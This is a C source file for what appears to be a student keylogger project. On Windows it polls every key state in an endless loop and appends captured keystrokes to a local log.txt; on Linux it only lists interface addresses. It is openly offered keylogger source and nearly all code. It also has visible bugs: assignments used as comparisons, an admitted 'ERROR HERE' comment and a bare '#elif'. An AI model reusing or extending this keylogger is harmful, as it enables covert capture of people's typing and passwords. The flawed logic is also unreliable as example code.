// 315 Keylogger Project
#include <stdio.h>
#include <stdlib.h>

// If on linux
#if defined (__linux)
  #include <arpa/inet.h>
  #include <sys/socket.h>
  #include <netdb.h>
  #include <ifaddrs.h>
  #include <unistd.h>
  #include <linux/if_link.h>
  int main(int argc, char *argv[]){
    printf("Compiled on linux?\n");
    struct ifaddrs *ifaddr, *ifa;
    int family, s, n;
    char host[NI_MAXHOST];
    if(getifaddrs (&ifaddr) == -1){
        perror ("getifaddrs");
        exit (EXIT_FAILURE);
      }

    // Walk through linked list, maintaining head pointer so we can free list later
    for (ifa = ifaddr, n = 0; ifa != NULL; ifa = ifa->ifa_next, n++){
      if (ifa->ifa_addr == NULL){
        continue;
      }
      family = ifa->ifa_addr->sa_family;
      // For an AF_INET* interface address, display the address
      if (family == AF_INET || family == AF_INET6){
        s = getnameinfo (ifa->ifa_addr,(family == AF_INET) ? sizeof (struct sockaddr_in) : sizeof (struct sockaddr_in6), host, NI_MAXHOST, NULL, 0, NI_NUMERICHOST);
        printf ("address: <%s>\n", host);
      }
    }
    freeifaddrs(ifaddr);
    exit(EXIT_SUCCESS);
  }
// Windows - The main program
#elif defined (_WIN32)
  #include <Windows.h>
  #pragma comment(lib, "User32.lib")

  // Global variables
  char vk_string[20];
  BOOL stand = FALSE;
  BOOL invalid = FALSE;

  // Key code processing
  void process_vKey(int vk){
    stand = FALSE;
    invalid = FALSE;
    //A-Z only
    if ( vk > 40 && vk < 90 || vk == 32){
      printf("[*] Key pressed %c with keycode %i\n", vk, vk);
      sprintf(vk_string, "%d", vk);
      stand = TRUE;
    }
    else if (vk == 13){
      strncpy(vk_string, "[ENTER]", 7);
      printf("[!] Key pressed %s with keycode %i\n", vk_string, vk);
    }
    else{
      printf("[*] Invalid keycode code: %i \n", vk);
      invalid = TRUE;
    }
  }

  // Main windows function
  int main(){
    printf("[*] Compiled on windows\n");

    int last_vKey = 0;
  	while (1){
  		for (int vKey = 3; vKey < 100; ++vKey)
  		{
  			if (GetAsyncKeyState(last_vKey) != 0)
  				continue;

  			last_vKey = vKey;

        // https://docs.microsoft.com/en-us/windows/desktop/api/winuser/nf-winuser-getasynckeystate
  			if (GetAsyncKeyState(vKey) != 0)
  			{
  				last_vKey = vKey;

          // Open text file with create or append
  				FILE *f = NULL;
  				fopen_s(&f, "log.txt", "a+");

          // Run key process function - this should proably be improved.
          process_vKey(vKey);

          // Check if it is a valid virtual key code
          if (invalid = TRUE){
            // Check if it is a standard keycode (A-z)
            if (stand = TRUE){
              int key = atoi(vk_string);
              sprintf_s(vk_string, sizeof(vk_string), "%c", key);
              printf("[+] Key processed: %c\n", key);
            }
            // Print unique keys like the enter button.
            else{
              // ERROR HERE: VK STRING IS WRONG.
              printf("[+] Key processed: %s\n", vk_string);
            }
            // Write to file
    				fwrite(vk_string, 1, 1, f);
          }
          // Close file
          fclose(f);
  			}
  		}
  	}
  }
#elif
    // If windows or linux is not defined
    int main(){
      printf("[-] Error while compiling... incompatable os\n");
      exit(0);
    }

#endif
